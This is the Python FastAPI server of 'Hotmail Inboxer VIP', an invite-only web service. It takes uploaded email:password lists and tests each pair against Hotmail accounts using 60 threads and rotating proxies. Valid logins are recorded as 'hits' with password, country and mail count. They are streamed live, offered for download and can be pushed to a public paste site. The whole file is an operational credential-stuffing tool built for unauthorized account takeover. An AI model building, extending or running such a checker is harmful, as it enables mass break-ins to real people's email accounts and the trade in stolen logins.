from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import asyncio, threading, os, json, requests, uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from database import *
from auth import *
from checker import checker_worker_single
from proxy_manager import proxy_manager

user_connections = {}
ws_lock = threading.Lock()
stop_flags = {}
stop_lock = threading.Lock()

MAX_WORKERS = 60 # Megemelt szálak a sebességért
ADMIN_EMAIL = "xat.king6969@gmail.com"

def upload_to_external_api(content: str, filename: str) -> str:
    if not content or len(content.strip()) == 0: return None
    try:
        res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=10)
        if res.status_code == 200: return f"https://pastebin.fi/raw/{res.json().get('key')}"
    except: pass
    return None

@asynccontextmanager
async def lifespan(app: FastAPI):
    print("\n🚀 Hotmail Inboxer VIP indítása...")
    async def initial_proxy_setup():
        await asyncio.to_thread(proxy_manager.fetch_proxies)
        await asyncio.to_thread(proxy_manager.test_and_filter, 3000, 500, 8)
    asyncio.create_task(initial_proxy_setup())
    async def proxy_refresh_loop():
        while True:
            await asyncio.sleep(2700)
            await asyncio.to_thread(proxy_manager.fetch_and_test)
    refresh_task = asyncio.create_task(proxy_refresh_loop())
    yield
    refresh_task.cancel()

app = FastAPI(title="Hotmail Inboxer VIP", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

def broadcast_to_user(user_id: str, message: str):
    with ws_lock:
        if user_id not in user_connections: return
        dead = []
        for ws_info in user_connections[user_id]:
            try: asyncio.run_coroutine_threadsafe(ws_info["ws"].send_text(message), ws_info["loop"])
            except: dead.append(ws_info)
        for d in dead: user_connections[user_id].remove(d)

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request): return templates.TemplateResponse("login.html", {"request": request})
@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request): return templates.TemplateResponse("register.html", {"request": request})
@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request): return templates.TemplateResponse("dashboard.html", {"request": request})
@app.get("/admin", response_class=HTMLResponse)
async def admin_page(request: Request): return templates.TemplateResponse("admin.html", {"request": request})

@app.post("/api/register")
async def register(email: str = Form(...), password: str = Form(...), invite_code: str = Form(...)):
    invite = await get_invite_code(invite_code)
    if not invite or invite.get("is_used"): raise HTTPException(status_code=400, detail="Érvénytelen kód!")
    if await get_user_by_email(email): raise HTTPException(status_code=400, detail="Foglalt email!")
    await create_user(email, hash_password(password), invite_code)
    await mark_invite_used(invite_code, email)
    return {"token": create_access_token({"sub": email}), "email": email}

@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    user = await get_user_by_email(email)
    if not user or not verify_password(password, user["password"]): raise HTTPException(status_code=401, detail="Hibás adatok!")
    return {"token": create_access_token({"sub": email}), "email": email}

@app.get("/api/me")
async def get_me(current_user=Depends(get_current_user)):
    return {"email": current_user["email"], "needs_new_invite": current_user.get("needs_new_invite", False)}

@app.post("/api/reactivate")
async def reactivate_account(invite_code: str = Form(...), current_user=Depends(get_current_user)):
    invite = await get_invite_code(invite_code)
    if not invite or invite.get("is_used"): raise HTTPException(status_code=400, detail="Érvénytelen kód!")
    await reactivate_user(current_user["email"], invite_code)
    await mark_invite_used(invite_code, current_user["email"])
    return {"status": "success"}

@app.get("/api/admin/invites")
async def get_invites(current_user=Depends(get_current_user)):
    if current_user["email"] != ADMIN_EMAIL: raise HTTPException(status_code=403)
    invites = await get_all_invites()
    for inv in invites:
        inv["_id"] = str(inv["_id"])
        inv["created_at"] = inv["created_at"].isoformat()
    return invites

@app.post("/api/admin/generate_invite")
async def generate_invite(current_user=Depends(get_current_user)):
    if current_user["email"] != ADMIN_EMAIL: raise HTTPException(status_code=403)
    new_code = "INBOX-" + str(uuid.uuid4()).split('-')[0].upper()
    await create_invite_code(new_code)
    return {"status": "success", "code": new_code}

@app.delete("/api/admin/invites/{code}")
async def delete_invite(code: str, current_user=Depends(get_current_user)):
    if current_user["email"] != ADMIN_EMAIL: raise HTTPException(status_code=403)
    await revoke_invite_and_lock_user(code)
    return {"status": "deleted"}

@app.post("/api/start")
async def start_checker(file: UploadFile, keyword: str = Form(...), threads: int = Form(MAX_WORKERS), current_user=Depends(get_current_user)):
    if current_user.get("needs_new_invite"): raise HTTPException(status_code=403, detail="Zárolva!")
    if await get_active_run(str(current_user["_id"])): raise HTTPException(status_code=400, detail="Már fut!")
    
    content = await file.read()
    lines = [l.strip() for l in content.decode("utf-8", errors="ignore").splitlines() if ':' in l and '@' in l]
    if not lines: raise HTTPException(status_code=400, detail="Üres fájl!")

    user_id = str(current_user["_id"])
    run_id = await create_run(user_id, keyword, len(lines))
    await delete_old_runs(user_id, run_id)
    with stop_lock: stop_flags[user_id] = asyncio.Event()

    threading.Thread(target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, threads)), daemon=True).start()
    return {"run_id": run_id, "total": len(lines)}

@app.post("/api/stop")
async def stop_checker(current_user=Depends(get_current_user)):
    user_id = str(current_user["_id"])
    with stop_lock:
        if user_id in stop_flags:
            stop_flags[user_id].set()
            return {"status": "stopping"}
    raise HTTPException(status_code=404)

async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int):
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    main_loop = asyncio.get_event_loop()
    lock = threading.Lock()

    def check_single(line):
        nonlocal checked, hits, custom, bad, retries
        with stop_lock:
            if user_id in stop_flags and stop_flags[user_id].is_set(): return
        try: email, password = line.split(':', 1)
        except: return
        
        result = checker_worker_single(email, password, keyword)
        with lock:
            checked += 1
            if result["status"] == "hit":
                hits += 1
                d = result["data"]
                lt = f"[HIT] {d['email']}:{d['password']} | {d['country']} | {d['mails']} mails"
                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "hit", lt), main_loop)
                asyncio.run_coroutine_threadsafe(add_result_details_to_run(run_id, "hit", d), main_loop)
                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": lt}))
                broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))
            elif result["status"] == "custom":
                custom += 1
                lt = f"[CUSTOM] {email}:{password}"
                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "custom", lt), main_loop)
                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": lt}))
            elif result["status"] == "bad":
                bad += 1
                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}))
            else: retries += 1

            if checked % 10 == 0 or checked == total:
                asyncio.run_coroutine_threadsafe(update_run_stats(run_id, {"checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries}), main_loop)
            broadcast_to_user(user_id, json.dumps({"type": "stats", "run_id": run_id, "checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries, "total": total}))

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        batch_size = num_threads * 2
        for i in range(0, len(lines), batch_size):
            with stop_lock:
                if user_id in stop_flags and stop_flags[user_id].is_set(): break
            futures = [executor.submit(check_single, line) for line in lines[i:i+batch_size]]
            for f in as_completed(futures): pass

    await update_run_status_only(run_id, "finished")
    broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))
    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "finish", "text": f"🏁 KÉSZ! Hits: {hits} | Bad: {bad}"}))
    with stop_lock:
        if user_id in stop_flags: del stop_flags[user_id]

@app.get("/api/runs")
async def get_user_runs_list(current_user=Depends(get_current_user)):
    runs = await get_user_finished_runs(str(current_user["_id"]))
    for r in runs:
        r["_id"] = str(r["_id"])
        r["started_at"] = r["started_at"].isoformat()
    return runs

@app.get("/api/get_download_url/{run_id}/{type}")
async def get_download_url(run_id: str, type: str, current_user=Depends(get_current_user)):
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]): raise HTTPException(status_code=404)
    if type == "hits" and run.get("hits_url"): return {"url": run["hits_url"]}
    return {"url": f"/api/download_direct/{run_id}/{type}"}

@app.get("/api/download_direct/{run_id}/{type}")
async def download_direct(run_id: str, type: str):
    run = await get_run(run_id)
    if not run: raise HTTPException(status_code=404)
    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
    return PlainTextResponse(content="\n".join(lines) if lines else "Nincs adat", headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'})

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    await websocket.accept()
    email = decode_token(token)
    if not email: return await websocket.close(code=1008)
    user = await get_user_by_email(email)
    if not user: return await websocket.close(code=1008)
    user_id = str(user["_id"])
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    with ws_lock:
        if user_id not in user_connections: user_connections[user_id] = []
        user_connections[user_id].append(ws_info)
    try:
        active_run = await get_active_run(user_id)
        if active_run:
            active_run["_id"] = str(active_run["_id"])
            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
        while True:
            data = await websocket.receive_text()
            if data == "ping": await websocket.send_text("pong")
    except:
        with ws_lock:
            if user_id in user_connections: user_connections[user_id].remove(ws_info)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
